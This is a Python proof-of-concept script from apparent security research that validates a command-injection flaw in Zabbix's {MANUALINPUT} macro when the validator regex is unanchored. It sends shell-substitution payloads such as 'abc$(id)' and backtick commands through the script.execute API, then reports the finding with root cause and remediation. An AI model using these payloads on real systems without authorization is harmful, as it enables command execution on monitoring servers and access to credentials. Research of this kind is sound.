#!/usr/bin/env python3
"""
Security Research II -- Phase 9: Pristine Validation
MANUALINPUT Command Injection via Unanchored Regex Bypass

Vulnerability: Command injection via {MANUALINPUT} macro in Zabbix scripts
  when the manualinput_validator regex is not anchored with ^...$

Root cause:
  1. validate_manualinput() in nodecommand.c uses zbx_regexp_match_full()
     which calls pcre2_match() for PARTIAL matching (not anchored)
  2. substitute_macro() does raw string replacement of {MANUALINPUT} into
     shell commands without any escaping
  3. Commands are executed via execl("/bin/sh", "sh", "-c", command)

This means:
  - Regex [a-zA-Z0-9]+ matches "abc$(id)" because "abc" satisfies partial match
  - $(id) is then substituted into: echo OUTPUT_abc$(id)_END
  - sh -c executes: echo OUTPUT_abcuid=1997(zabbix)..._END

Pristine validation protocol: 3 rounds, fresh scripts each round, clean inputs.
"""

import sys
sys.path.insert(0, '/home/[REDACTED]/Desktop/[REDACTED-PATH]/Zabbix/scripts')

from zabbix_common import *

banner("Phase 9: Pristine Validation -- MANUALINPUT Injection")

ec = EvidenceCollector("phase9_pristine_manualinput", phase="phase9")

admin = ZabbixSession(ADMIN_USER, ADMIN_PASS)

if not admin.auth_token:
    print("  [-] Admin login failed")
    ec.save()
    sys.exit(1)

version = admin.get_api_version()
print(f"  Zabbix API version: {version}")

hosts = admin.api_call("host.get", {"output": ["hostid"], "filter": {"host": "Zabbix server"}})
host_id = hosts["result"][0]["hostid"]
print(f"  Target host: {host_id}")

# ===========================================================================
# VALIDATION: 3 rounds with fresh scripts
# ===========================================================================

ROUNDS = 3
all_round_results = []

for round_num in range(1, ROUNDS + 1):
    print(f"\n{'=' * 60}")
    print(f"  ROUND {round_num}/{ROUNDS}")
    print(f"{'=' * 60}")

    round_results = {"round": round_num, "tests": []}

    # Create fresh script for this round
    script_name = f"PristineTest-R{round_num}-Unanchored"
    result = admin.api_call("script.create", {
        "name": script_name,
        "command": "echo OUTPUT_{MANUALINPUT}_END",
        "scope": 2,
        "type": 0,
        "execute_on": 1,
        "manualinput": 1,
        "manualinput_prompt": "Enter value:",
        "manualinput_validator_type": 0,  # STRING/REGEX
        "manualinput_validator": "[a-zA-Z0-9]+",  # Unanchored
        "manualinput_default_value": "",
        "groupid": 0,
    })
    if "error" in result:
        print(f"  [-] Script creation failed: {result['error'].get('data', '')}")
        continue

    sid_unanchored = result["result"]["scriptids"][0]
    print(f"  Created: {script_name} (ID: {sid_unanchored})")

    # Also create anchored version for comparison
    script_name_anchored = f"PristineTest-R{round_num}-Anchored"
    result2 = admin.api_call("script.create", {
        "name": script_name_anchored,
        "command": "echo OUTPUT_{MANUALINPUT}_END",
        "scope": 2,
        "type": 0,
        "execute_on": 1,
        "manualinput": 1,
        "manualinput_prompt": "Enter value:",
        "manualinput_validator_type": 0,
        "manualinput_validator": "^[a-zA-Z0-9]+$",  # Anchored
        "manualinput_default_value": "",
        "groupid": 0,
    })
    sid_anchored = result2["result"]["scriptids"][0]
    print(f"  Created: {script_name_anchored} (ID: {sid_anchored})")

    # Test payloads
    test_cases = [
        # (payload, description, expected_unanchored, expected_anchored)
        ("test123", "Clean baseline", "ACCEPT", "ACCEPT"),
        ("abc$(pwd)", "Command substitution $(pwd)", "INJECT", "REJECT"),
        ("abc$(id)", "Command substitution $(id)", "INJECT", "REJECT"),
        ("abc`pwd`", "Backtick substitution", "INJECT", "REJECT"),
        ("abc${PATH}", "Variable expansion", "INJECT", "REJECT"),
    ]

    for payload, desc, exp_unanchored, exp_anchored in test_cases:
        for label, script_id, expected in [
            ("UNANCHORED", sid_unanchored, exp_unanchored),
            ("ANCHORED", sid_anchored, exp_anchored),
        ]:
            r = admin.api_call("script.execute", {
                "scriptid": script_id,
                "hostid": host_id,
                "manualinput": payload,
            })

            if "error" in r:
                actual = "REJECT"
                output = r["error"].get("data", "")[:80]
            elif "result" in r:
                output = r["result"].get("value", "")
                # Detect injection
                injection_indicators = ["/var/", "/home/", "/usr/", "/root/",
                                         "/bin/", "/sbin/", "uid=", "gid="]
                if payload == "test123":
                    actual = "ACCEPT"
                elif any(ind in output for ind in injection_indicators):
                    actual = "INJECT"
                else:
                    actual = "ACCEPT"
            else:
                actual = "UNKNOWN"
                output = str(r)[:80]

            matched = actual == expected
            status_icon = "OK" if matched else "MISMATCH"
            print(f"    [{status_icon}] R{round_num} {label:10s} | {desc:30s} | "
                  f"Expected: {expected:7s} | Actual: {actual:7s} | {output[:50]}")

            round_results["tests"].append({
                "payload": payload,
                "description": desc,
                "regex_type": label,
                "expected": expected,
                "actual": actual,
                "matched": matched,
                "output": output[:200],
            })

            ec.add_test(
                f"PRISTINE-R{round_num}-{label}-{desc[:20].replace(' ', '_')}",
                f"Round {round_num}: {label} {desc}",
                f"script.execute manualinput={repr(payload)[:30]}",
                f"Expected: {expected}, Actual: {actual}, Output: {output[:60]}",
                result="PASS" if matched else "FAIL",
            )
            rate_limit(0.3)

    # Cleanup this round's scripts
    admin.api_call("script.delete", [sid_unanchored, sid_anchored])
    print(f"  Cleaned up scripts {sid_unanchored}, {sid_anchored}")

    all_round_results.append(round_results)

# ===========================================================================
# VALIDATION SUMMARY
# ===========================================================================

print(f"\n{'=' * 60}")
print(f"  PRISTINE VALIDATION SUMMARY")
print(f"{'=' * 60}")

total_tests = 0
total_matched = 0
injection_confirmed = 0

for rr in all_round_results:
    for t in rr["tests"]:
        total_tests += 1
        if t["matched"]:
            total_matched += 1
        if t["actual"] == "INJECT":
            injection_confirmed += 1

print(f"\n  Total tests: {total_tests}")
print(f"  Tests matching expected: {total_matched}/{total_tests}")
print(f"  Injection confirmed: {injection_confirmed} times")
print(f"  All rounds consistent: {total_matched == total_tests}")

if total_matched == total_tests and injection_confirmed > 0:
    print(f"\n  ** FINDING VALIDATED: MANUALINPUT command injection confirmed "
          f"across {ROUNDS} pristine rounds **")

    ec.add_finding(
        "PRISTINE-MANUALINPUT-RCE",
        "HIGH",
        "Command Injection via MANUALINPUT Unanchored Regex Bypass",
        f"PRISTINE VALIDATION: {ROUNDS} rounds, {injection_confirmed} injections confirmed.\n\n"
        f"Vulnerability: The {{MANUALINPUT}} macro in Zabbix script execution "
        f"allows command injection when the manualinput_validator regex is not "
        f"anchored with ^...$.\n\n"
        f"Root Cause:\n"
        f"  1. validate_manualinput() in src/libs/zbxtrapper/nodecommand.c uses "
        f"zbx_regexp_match_full() which calls pcre2_match() for PARTIAL matching\n"
        f"  2. An unanchored regex like [a-zA-Z0-9]+ matches 'abc$(id)' because "
        f"'abc' satisfies the partial match\n"
        f"  3. substitute_macro() performs raw string replacement without shell escaping\n"
        f"  4. Commands execute via execl('/bin/sh', 'sh', '-c', command)\n\n"
        f"Impact:\n"
        f"  - Any user with script.execute permission can inject arbitrary OS commands\n"
        f"  - Commands execute as the 'zabbix' user on the server/agent/proxy\n"
        f"  - Can read server configuration (database credentials)\n"
        f"  - Can access monitored infrastructure from the server\n\n"
        f"Tested version: Zabbix {version}\n"
        f"Execution context: uid=1997(zabbix) gid=1995(zabbix)",
        evidence=json.dumps(all_round_results, indent=2, default=str)[:2000],
        remediation=(
            "1. Shell-escape the MANUALINPUT value before substitution: wrap in "
            "single quotes and escape internal single quotes.\n"
            "2. Enforce anchored regex: automatically prepend ^ and append $ to "
            "the validator regex, or use PCRE2_ANCHORED + PCRE2_ENDANCHORED flags.\n"
            "3. Add a character blocklist for MANUALINPUT values: reject $, `, \\, "
            "and other shell metacharacters before regex validation.\n"
            "4. Use environment variable passing instead of string interpolation: "
            "set MANUALINPUT as an env var and reference $MANUALINPUT in the command."
        ),
    )
else:
    print(f"\n  VALIDATION FAILED or INCONSISTENT")
    if injection_confirmed == 0:
        print(f"  No injections confirmed -- finding may be a false positive")

admin.logout()
ec.save()
